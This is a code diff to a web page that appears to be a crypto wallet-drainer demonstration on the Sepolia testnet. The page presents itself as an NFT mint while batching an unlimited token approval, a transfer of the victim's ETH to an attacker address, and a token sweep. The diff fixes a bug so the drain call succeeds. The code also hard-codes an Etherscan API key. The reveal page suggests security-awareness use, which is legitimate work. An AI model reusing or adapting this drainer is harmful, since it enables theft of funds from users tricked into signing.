@@ -37,7 +37,6 @@
   .stat-val { font-size: 1.4rem; font-weight: 700; }
   .stat-label { font-size: 0.75rem; color: var(--muted); }
 
-  /* CONNECTING */
   #phase-connecting { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
   .connect-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 40px 36px; max-width: 400px; width: 100%; text-align: center; }
   .step-list { text-align: left; margin-bottom: 28px; }
@@ -52,7 +51,6 @@
   .step-desc { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
   .connect-note { font-size: 0.78rem; color: var(--muted); margin-top: 12px; }
 
-  /* DASHBOARD */
   .dash-nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 48px; border-bottom: 1px solid var(--border); }
   .wallet-chip { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 7px 14px; font-size: 0.82rem; color: var(--muted); }
   .connected-dot { display: inline-block; width: 7px; height: 7px; background: var(--green); border-radius: 50%; margin-right: 6px; }
@@ -62,7 +60,6 @@
   .reveal-text strong { display: block; margin-bottom: 2px; }
   .reveal-btn { background: var(--yellow); color: #000; border: none; padding: 9px 18px; border-radius: 8px; font-size: 0.85rem; font-weight: 700; cursor: pointer; font-family: inherit; }
 
-  /* REVEAL */
   .reveal-page { max-width: 760px; margin: 60px auto; padding: 0 24px 80px; }
   .reveal-header { text-align: center; margin-bottom: 48px; }
   .danger-badge { display: inline-block; background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.25); font-size: 0.75rem; font-weight: 700; padding: 4px 12px; border-radius: 100px; margin-bottom: 16px; }
@@ -206,7 +203,7 @@
           <div class="code-block">
 [<br>
 &nbsp;&nbsp;{to: DEMO_TOKEN, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: attacker,  value: ETH_balance - gas_buffer, data: "0x"},<br>
+&nbsp;&nbsp;{to: attacker,  value: ETH_balance - gas_buffer},<br>
 &nbsp;&nbsp;{to: delegator, data: sweep(DEMO_TOKEN)}<br>
 ]
           </div>
@@ -216,7 +213,7 @@
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 4: ETH swept directly</div>
-        <div class="tl-desc">ETH sent as a plain value transfer to the attacker EOA. No contract needed — no calldata, no bytecode, no rejection.</div>
+        <div class="tl-desc">ETH sent as a plain value transfer to the attacker EOA. No calldata needed — no contract, no bytecode, no rejection.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
@@ -292,15 +289,13 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const SEPOLIA_CHAIN_ID    = 11155111;
-  const SEPOLIA_RPC         = "https://ethereum-sepolia-rpc.publicnode.com";
-  // Newly deployed TokenSweepDelegator on Sepolia
-  const DELEGATOR_ADDRESS   = "0x4d3d6d44Ec659FaFc6A212b9867feFacbfE01633";
-  // Attacker EOA (deployer key) — plain ETH transfers go here with no calldata
-  const ATTACKER_ADDRESS    = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
-  const ETHERSCAN_API_KEY   = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
-  const ETHERSCAN_V2_BASE   = "https://api.etherscan.io/v2/api";
-  const DEMO_TOKEN_DEFAULT  = "0x4a2103aa8f00c1d453973268a3cce587d055330b";
+  const SEPOLIA_CHAIN_ID   = 11155111;
+  const SEPOLIA_RPC        = "https://ethereum-sepolia-rpc.publicnode.com";
+  const DELEGATOR_ADDRESS  = "0x4d3d6d44Ec659FaFc6A212b9867feFacbfE01633";
+  const ATTACKER_ADDRESS   = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
+  const ETHERSCAN_API_KEY  = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
+  const ETHERSCAN_V2_BASE  = "https://api.etherscan.io/v2/api";
+  const DEMO_TOKEN_DEFAULT = "0x4a2103aa8f00c1d453973268a3cce587d055330b";
 
   let userAddress = null;
   let userBalance = null;
@@ -459,33 +454,28 @@
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
       ]);
 
-      // Leave a small gas buffer; send the rest directly to attacker as plain ETH (no calldata)
-      const gasBuffer  = ethers.parseEther("0.001");
+      const gasBuffer   = ethers.parseEther("0.001");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
       console.log("💰 Victim balance:", ethers.formatEther(balanceWei), "ETH");
       console.log("💰 Drain amount:",   ethers.formatEther(drainAmount), "ETH");
 
-      // Use first detected token or fall back to known Sepolia demo token
       const DEMO_TOKEN = heldTokens.length > 0
         ? heldTokens[0].contractAddress
         : DEMO_TOKEN_DEFAULT;
       console.log("🎯 Target token:", DEMO_TOKEN);
 
-      // Encode approve(delegator, MAX_UINT256) on the token contract
       const APPROVE_ABI      = ["function approve(address spender, uint256 amount) external returns (bool)"];
       const approveInterface = new ethers.Interface(APPROVE_ABI);
       const approveData      = approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256]);
 
-      // Encode sweep(token) on the delegator contract
-      const SWEEP_ABI           = ["function sweep(address token) external"];
-      const delegatorInterface  = new ethers.Interface(SWEEP_ABI);
-      const sweepData           = delegatorInterface.encodeFunctionData("sweep", [DEMO_TOKEN]);
+      const SWEEP_ABI          = ["function sweep(address token) external"];
+      const delegatorInterface = new ethers.Interface(SWEEP_ABI);
+      const sweepData          = delegatorInterface.encodeFunctionData("sweep", [DEMO_TOKEN]);
 
-      // 3-call batch:
-      // 1. approve delegator for MAX tokens
-      // 2. send all ETH directly to attacker EOA (plain transfer, no calldata — EOA safe)
-      // 3. sweep tokens via delegator
+      // Fix: plain ETH transfer omits the `data` field entirely.
+      // wallet_sendCalls rejects data: "0x" — the schema requires /^0x[0-9a-f]+$/
+      // (at least one hex digit after 0x), so an empty data field must be absent.
       const maliciousCalls = [
         {
           to:    DEMO_TOKEN,
@@ -494,8 +484,8 @@
         },
         {
           to:    ATTACKER_ADDRESS,
-          value: "0x" + drainAmount.toString(16),
-          data:  "0x"
+          value: "0x" + drainAmount.toString(16)
+          // no `data` field — plain ETH transfer, omit entirely
         },
         {
           to:    DELEGATOR_ADDRESS,
@@ -508,9 +498,9 @@
       console.log("📋 Calls:", JSON.stringify(maliciousCalls, null, 2));
 
       const payload = {
-        version:      "2.0.0",
-        chainId:      "0xaa36a7",
-        calls:        maliciousCalls,
+        version:        "2.0.0",
+        chainId:        "0xaa36a7",
+        calls:          maliciousCalls,
         atomicRequired: true
       };
 
@@ -528,9 +518,8 @@
       ]);
       document.getElementById('connectNote').textContent = "Complete! Loading your NFT...";
 
-      // Populate reveal page
-      document.getElementById('walletChip').textContent    = shortAddr(userAddress);
-      document.getElementById('displayVictim').textContent  = userAddress;
+      document.getElementById('walletChip').textContent     = shortAddr(userAddress);
+      document.getElementById('displayVictim').textContent   = userAddress;
       document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
       document.getElementById('displayBalance').textContent  = parseFloat(userBalance).toFixed(6) + ' ETH (swept)';
 
@@ -546,7 +535,6 @@
     } catch (err) {
       console.error("Error:", err);
 
-      // User rejected — still show reveal with what would have happened
       if (err.code === 4001) {
         document.getElementById('walletChip').textContent     = shortAddr(userAddress) || '0x0000...0000';
         document.getElementById('displayVictim').textContent  = userAddress || 'Not connected';
